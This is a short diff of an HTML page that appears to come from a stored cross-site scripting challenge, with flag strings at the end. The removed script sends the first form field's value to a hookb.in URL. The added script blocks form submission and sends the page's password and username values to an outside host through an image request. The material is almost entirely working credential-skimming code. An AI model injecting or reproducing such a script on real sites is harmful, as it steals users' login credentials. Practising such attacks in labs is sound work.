@@ -11,8 +11,12 @@
 </div>
 
 <script>
-const form = document.forms[0];
-function logSubmit(event) 
-{new Image().src='https://hookb.in/aBQwMZx0PJu1oobLKw1D?d='+document.forms[0].elements[0].value;}
-form.addEventListener('submit', logSubmit);
+document.getElementsByTagName("FORM")[0].addEventListener('submit', function(evt){
+evt.preventDefault();
+new Image().src='http://cthulhu.diax.mx/cookiemonster.php?d='+document.getElementsByName('password')[0].value+"//--//"+document.getElementsByName('username')[0].value;
+})
 </script>
+
+
+xss_st0r3d_c4n_b3_d4n93r0u$_t0o! 
+st0r3d_xss_c4n_b3_d4n93r0u$_t0o!
